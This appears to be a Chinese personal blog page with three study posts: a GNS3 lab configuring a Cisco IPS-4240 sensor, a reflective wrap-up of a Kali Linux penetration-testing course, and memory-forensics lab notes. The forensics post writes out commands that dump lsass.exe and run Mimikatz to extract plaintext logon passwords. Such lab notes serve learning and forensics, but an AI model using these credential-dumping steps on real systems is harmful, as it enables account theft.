<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;3&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/3/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/09/IPS%E7%AC%94%E8%AE%B0-5%EF%BC%9AIME--IPS%E5%AE%9E%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/09/IPS%E7%AC%94%E8%AE%B0-5%EF%BC%9AIME--IPS%E5%AE%9E%E9%AA%8C/" itemprop="url">IPS笔记-5：IME--IPS实验</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-09T22:56:39+08:00">
                2020-03-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IPS/" itemprop="url" rel="index">
                    <span itemprop="name">IPS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  465 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-IDS模拟实验"><a href="#1-IDS模拟实验" class="headerlink" title="1. IDS模拟实验"></a>1. IDS模拟实验</h4><ul>
<li>R1：Router C3700</li>
<li>R1：Router C3700</li>
<li>IDS：IPS-4240</li>
<li>SW：以太网交换机</li>
<li>▲ 2020.03.09 虚拟机IPS-4240的虚拟网卡VMware1和VMware2需要开启主机连接，且若在GNS3中无出现此两个网卡，可重启计算机，即可抓到这两个网卡</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=56511I2jXJa2dX1QPwdksnNvE15cDIIbCCNGbESMkLLlkbWF5pJqyvAba9ZmAHYKsFEnOt4f_earDpVRDR_lUO0i_5D80LwaXddx6JgOG2iv4uWV5v5BSvfJJFcI9o-VEk5Z0i0NCqGS8EQ6wq1xcOC_BMlVU-_yOHMtqziVeAUp&file_name=/IPS-4240%E5%BC%80%E5%90%AF%E7%9A%84%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5.png" alt="IPS-4240开启的主机连接"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=6f50bVPzAkiBYeYvlwGlA4QbhkewxGpBkJhcUn_o-2iEZfow8PMvCIObjrR4zqTOv-7emsnATh4I2XKq9TKTtwCnqQujGC5Gd0rz9R1ncTvA0bnVeAaN0gxW9_BTMqeTVxMUCI0JmebXc_vzCqQV7LWDp3vkrAGe8aOR-7NYx1Xz_g&file_name=/IPS%E5%9C%A8%E7%BA%BF%E6%A8%A1%E5%BC%8F%E6%8A%A5%E8%AD%A6%E6%8B%93%E6%89%91%E5%9B%BE.png" alt="IPS在线模式报警拓扑图"></p>
<h4 id="2-IDS：IPS-4240"><a href="#2-IDS：IPS-4240" class="headerlink" title="2. IDS：IPS-4240"></a>2. IDS：IPS-4240</h4><ul>
<li>改变外形：右键 -&gt; Change Symbol -&gt; ids</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; IDS</li>
<li>增加监控网卡：Configure -&gt; NIO Ethernet -&gt; Add VMnet1</li>
<li>增加监控网卡：Configure -&gt; NIO Ethernet -&gt; Add VMnet2</li>
</ul>
<h4 id="3-R1和R2"><a href="#3-R1和R2" class="headerlink" title="3. R1和R2"></a>3. R1和R2</h4><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>配置R1<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.1 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>配置R2<ul>
<li>conf t</li>
<li>interface f0/1</li>
<li>ip add 10.1.1.2 255.255.255.0</li>
<li>no sh</li>
</ul>
</li>
<li>连通性：R1 -&gt; do ping 10.1.1.2 -&gt; R2是否联通</li>
</ul>
<h4 id="4-SW：Ethernet-switch"><a href="#4-SW：Ethernet-switch" class="headerlink" title="4. SW：Ethernet switch"></a>4. SW：Ethernet switch</h4><ul>
<li>启动，降低系统资源消耗：右键 -&gt; Idle PC -&gt; 选取带*号的参数设备</li>
<li>修改名字：右键 -&gt; Change the hostname -&gt; SW</li>
<li>增加接口：右键 -&gt; Slots -&gt; 增加一个NM-16ESW</li>
</ul>
<h4 id="5-测试连通性"><a href="#5-测试连通性" class="headerlink" title="5. 测试连通性"></a>5. 测试连通性</h4><ul>
<li>R1(f 1/0)-&gt; SW(1)</li>
<li>R2(f 1/0)-&gt; SW(2)</li>
<li>IDS -&gt; SW(3)</li>
<li>IDS -&gt; SW(4)</li>
</ul>
<h4 id="6-拓扑配置"><a href="#6-拓扑配置" class="headerlink" title="6. 拓扑配置"></a>6. 拓扑配置</h4><ul>
<li>▲ 所有的步骤都需要进行Apply</li>
<li>IME中配置接口对（mypair）<ul>
<li>Configuration -&gt; Interface Pairs -&gt; Add -&gt; 选取一对接口 -&gt; 开启</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ee5aDjF8ij0H1bpEM-ZGenCGKHRCu55j013TaOlBv7xJR1wqCObDm4lHvT5RfT3A9Nr9SaiFowqApAOCjXRY891uK_7WFpNqeudPyU4Zrmz9FfcMTev7Ubl0gZbipZurAyN3Dpi2CVY2OAPZYA2tNMNr4UPz7_vn&file_name=/IME--IPS%E9%85%8D%E7%BD%AEmypair.png" alt="IME--IPS配置mypair"></p>
<ul>
<li>绑定病毒特征识别库Sig0<ul>
<li>Configuration -&gt; Policies -&gt; vs0 -&gt; Edit -&gt; mypair</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=4f4f_y9kjeXgiWfYD10y0tL9qOjXd6CuQsGPf0BRmMHvN4e-MIVJpuWakDVKWr3gc-Yu5n6LJmqDQGRMt2pYGx0poPC4XDRb_tp2zfs07QrErcxF18ofa_zr3D4CSo6x2_BkJBLxilHe3qIuq4H1mchASvBVZ1aiRhVc8kFNXRYb5iwLLa5mglCeXg&file_name=/IME--IPS%E7%BB%91%E5%AE%9A%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IPS绑定病毒特征识别库Sig0"></p>
<ul>
<li><p>划分VLAN</p>
<ul>
<li>SW<ul>
<li>端口1、3属于VLAN2</li>
<li>端口2、4属于VLAN3</li>
</ul>
</li>
</ul>
</li>
<li><p>连通性：R1 -&gt; ping 10.1.1.2 -&gt; R2是否连通</p>
</li>
</ul>
<h4 id="7-入侵检测"><a href="#7-入侵检测" class="headerlink" title="7. 入侵检测"></a>7. 入侵检测</h4><ul>
<li>▲ 所有的步骤都需要进行Apply</li>
<li>配置病毒特征识别库Sig0<ul>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Change status To -&gt; Active</li>
<li>Sig0 -&gt; OS -&gt; 2004(过滤) -&gt; Enable</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=3b9cXq0DB29FU10np_frrLzC_IVfYYZTS8pWCZM2Gy08iJz_LNkcsBXgC_-pDO1nPPopFQYUzi7VInUBhebpLqCZ6VxQcTt2YPMvkIf_z8JJXdrMhHiYtiukaw-v0MEWgwkoytb1f1RVMkQ4rL2QjIhHZ_RYUPSmp4xa179qM4BwU1ziWo1cumHrGw&file_name=/IME--IPS%E9%85%8D%E7%BD%AE%E7%97%85%E6%AF%92%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%BA%93Sig0.png" alt="IME--IPS配置病毒特征识别库Sig0"></p>
<ul>
<li>监控IPS-ICMP事件<ul>
<li>Configuration -&gt; Sensor Monitoring -&gt; View</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=6b9fjbOtsO406SWGgfhPYMhdGHdWDB8rEk3alFZeNcytWWb9eWZ1AYulvqVVihV71h_fbZvIMpBonXMEe09OsEvBNo07kRoDE_z9HXRQnKBidJMqssVvfekE-m-aWS3KxLct3DaccSLd67dFkLaaLB-lc-9YJLu6QjEsKPKuIJU&file_name=/IME--IPS%E7%9B%91%E6%8E%A7IPS-ICMP%E4%BA%8B%E4%BB%B6.png" alt="IME--IPS监控IPS-ICMP事件"></p>
<ul>
<li>R1向R2发生ICMP Echo Requset的Ping包，查看IME–IPS的Event Viewer有无报警日志</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=f3baDJtswMQm1FbKQV9WiuY5peBe3KxkMLFiyORcmKIfdKRY0K6qD6ijs_uuVZrWK5AoIQhKTfihDykxqPH9kxEWQCq8sJfIkygf4UmqR8gBmP2s1mtXMQdHilIHtJ8bM72CuGOJQqDTMla3AJ_t52QnZ3s-T5FndgFh&file_name=/IME--IPS%E7%9B%91%E6%8E%A7IPS%E4%BA%8B%E4%BB%B6.png" alt="IME--IPS监控IPS事件"> </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/05/Kali%20Linux%E7%AC%94%E8%AE%B0--%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/05/Kali%20Linux%E7%AC%94%E8%AE%B0--%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E/" itemprop="url">Kali Linux笔记--写在最后</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-05T09:33:53+08:00">
                2020-03-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  496 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><h2 id="安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程"><a href="#安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程" class="headerlink" title="安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程"></a>安全牛苑老师的KALI的课程，虽说是讲KALI，但我很认同老师说的话，这是市面上，讲渗透，最系统，最完整，最深入的一个课程</h2><ul>
<li>课程内容<ul>
<li>Kali安装与实验环境搭建  -&gt;  √ </li>
<li>基本攻击  -&gt;  √</li>
<li>信息收集  -&gt;  √</li>
<li>主动信息收集  -&gt;  √</li>
<li>弱点扫描  -&gt;  √</li>
<li>缓冲区溢出  -&gt;  √</li>
<li>提权  -&gt;  √</li>
<li>无线攻击  -&gt;  X</li>
<li>Web安全  -&gt;  √</li>
<li>密码破解  -&gt;  √</li>
<li>流量操控与隧道技术  -&gt;  √</li>
<li>拒绝服务  -&gt;  √</li>
<li>免杀  -&gt;  √</li>
<li>Metasploit Framework  -&gt;  √</li>
<li>取证  -&gt;  √</li>
</ul>
</li>
<li>▲ 无线安全独立于其他模块，而且对于其他部分内容影响几乎没有，所有暂无学，在不久的将来，若有涉及到，会再翻回来继续学习，聆听苑老师的课，开启1.5倍加速，哈哈哈哈哈….</li>
</ul>
<h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><h3 id="从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢文华大佬提供的帮助和支持-是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。"><a href="#从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢文华大佬提供的帮助和支持-是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。" class="headerlink" title="从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢文华大佬提供的帮助和支持,是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。"></a>从2019年的11月18日开始，到2020年的3月4日，原本计算在放假前完成的任务，硬是放缓到开学阶段，虽然赶上了新冠病毒的影响在家学习，整个过程经历了107天，完整文章117篇，到最后完成的这一刻，算是给自己一个交代了，总认为自己不能持之以恒的完成一件事，现在算完成一件事了，也给自己的学习迈出了一小步，认识到了渗透的方方面面，也渐渐能听懂大佬们讲的话，在这个过程中，很感谢<a href="https://fengwenhua.top/" target="_blank" rel="noopener">文华大佬</a>提供的帮助和支持,是他给我资料，带我入门，是我的启蒙师傅了，在接下去的时间内，要开始深入Web安全的学习，然后再转而内网的其他方方面面，希望在大三的暑假，能找到一份对口的专业实习。</h3><h3 id="107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？"><a href="#107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？" class="headerlink" title="107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？"></a>107天熬成了一个系统学习渗透，另一个107天，我将又走到哪一步呢？</h3><h3 id="最后，借用文华大佬的一句话，慢慢来，不急不急…"><a href="#最后，借用文华大佬的一句话，慢慢来，不急不急…" class="headerlink" title="最后，借用文华大佬的一句话，慢慢来，不急不急…."></a>最后，借用文华大佬的一句话，慢慢来，不急不急….</h3>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%83)%EF%BC%9A%E6%B4%BB%E5%8F%96%E8%AF%81%E5%92%8C%E6%AD%BB%E5%8F%96%E8%AF%81/" itemprop="url">Kali Linux笔记(一百一十七)：活取证和死取证</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T23:45:00+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.4k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  5 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-活取证"><a href="#1-活取证" class="headerlink" title="1. 活取证"></a>1. 活取证</h4><ul>
<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
<li>从内存还原文字<ul>
<li>procdump：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a> <ul>
<li>存在Linux版本，GitHub链接：<a href="https://github.com/Microsoft/ProcDump-for-Linux" target="_blank" rel="noopener">https://github.com/Microsoft/ProcDump-for-Linux</a></li>
</ul>
</li>
<li>strings：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings</a></li>
<li><strong><code>🔺命令：procdump -ma notepad.exe notepad.dmp</code></strong>（记事本的进程）</li>
<li><strong><code>🔺命令：strings notepad.dmp &gt; notepad.txt</code></strong>（只识别连续三个以上的ASCII码字符）</li>
<li>其他文字处理程序也适用</li>
</ul>
</li>
<li>从内存还原图片<ul>
<li>远程桌面、画图工具、Virtualbox虚拟机（dump取虚拟机window XP SP3的图像）</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3x86 memdump -p 1456 -D test</code></strong> </li>
<li><strong><code>🔺命令：mv mstsc.dmp mstsc.data</code></strong></li>
<li>Gimp -&gt; open -&gt; Raw Image Data -&gt; 调整参数</li>
</ul>
</li>
<li>从内存中提取明文密码<ul>
<li><strong><code>🔺命令：procdump.exe -ma lsass.exe lsa.dmp</code></strong></li>
<li><strong><code>🔺命令：Mimikatz</code></strong> </li>
<li><strong><code>🔺命令：sekurlsa::minidump lsass.dmp</code></strong> </li>
<li><strong><code>🔺命令：sekurlsa::logonPasswords</code></strong> </li>
</ul>
</li>
<li>Volatility的mimikatz插件<ul>
<li><a href="https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py" target="_blank" rel="noopener">https://github.com/sans-dfir/sift-files/blob/master/volatility/mimikatz.py</a></li>
</ul>
</li>
<li>Firefox浏览器审计工具<ul>
<li><strong><code>🔺命令：dumpzilla /root/.mozilla/firefox/bvpenhsu.default/ --All</code></strong></li>
</ul>
</li>
</ul>
<h4 id="2-实验–从内存还原文字"><a href="#2-实验–从内存还原文字" class="headerlink" title="2. 实验–从内存还原文字"></a>2. 实验–从内存还原文字</h4><ul>
<li>Window XP SP3<ul>
<li>拷贝procdump到window XP SP3上</li>
<li>找一段文字写入notepad中，<strong><code>🔺命令：netstat -nao</code></strong>查看进程是否有notepad.exe</li>
<li><strong><code>🔺命令：procdump.exe -ma notepad.exe notepad.dmp</code></strong></li>
<li><strong><code>🔺命令：strings.exe notepad.dmp &gt; notepad.txt</code></strong></li>
<li>对比两个文件的内容，是否存在相同（搜索特征字符）</li>
</ul>
</li>
</ul>
<h4 id="3-实验–从内存还原图片"><a href="#3-实验–从内存还原图片" class="headerlink" title="3. 实验–从内存还原图片"></a>3. 实验–从内存还原图片</h4><ul>
<li>▲ 图片不同于图像，图像在软件中保存后，可以导出为图片</li>
<li>Window XP SP3<ul>
<li>截图工具 → 随意截取一张图片 → 保存图片到桌面 → 用画图工具打开</li>
<li><strong><code>🔺命令：cmd → tasklist</code></strong><ul>
<li>在Window XP SP3上暂不能执行此命令</li>
</ul>
</li>
<li><strong><code>🔺命令：procdump.exe -ma mspaint.exe mspaint.dmp</code></strong></li>
<li>Win+R → mstsc → 远程连接一个机器</li>
<li><strong><code>🔺命令：cmd → tasklist</code></strong></li>
<li><strong><code>🔺命令：procdump.exe -ma mstsc.exe mstsc.dmp</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li>从共享文件中拷贝mspaint.dmp和mstsc.dmp文件</li>
<li><strong><code>🔺命令：apt-get install gimp</code></strong></li>
<li>打开gimp</li>
<li><strong><code>🔺命令：mv mspaint.dump mspaint.data</code></strong></li>
<li><strong><code>🔺命令：mv mstsc.dump mstsc.data</code></strong></li>
<li>gimp打开mstsc.data/mspaint.data</li>
<li>调整Offset、Width、Height（高度一般不起作用，宽度一般其决定作用）</li>
<li>▲ 2020.03.04 gimp通过滑块去移动会导致软件崩溃，只能通过值输入</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=48e45Bke8q0F7yArsOLuB5_Yhnsd2bWW4p_mrI1lHPTmdWxeUjl8P05D19Ms78xY2oAQJAC8maImTmwiImGSelIJMfRreJTtDy4jHe-4zHz4sXGQ44AgABhcQWqwQi1OQPxlwcrzbw&file_name=/gimp%E6%89%93%E5%BC%80%E5%86%85%E5%AD%98%E5%9B%BE%E7%89%87.png" alt="gimp打开内存图片"></p>
<h4 id="4-实验–从内存提取明文密码"><a href="#4-实验–从内存提取明文密码" class="headerlink" title="4. 实验–从内存提取明文密码"></a>4. 实验–从内存提取明文密码</h4><ul>
<li>Window XP SP3<ul>
<li><strong><code>🔺命令：procdump.exe -ma lsass.exe lsa.dmp</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：cd /usr/share/mimikatz</code></strong></li>
<li>压缩mimikatz x86为一个x86.zip文件</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>拷贝.x86到window XP SP3的机子上</li>
<li>双击mimikatz打开</li>
<li><strong><code>🔺命令：sekurlsa::</code></strong></li>
<li><strong><code>🔺命令：sekurlsa::minidump lsa.dmp</code></strong></li>
<li><strong><code>🔺命令：sekurlsa::logonPasswords</code></strong></li>
<li>查看dump下来的身份信息</li>
</ul>
</li>
</ul>
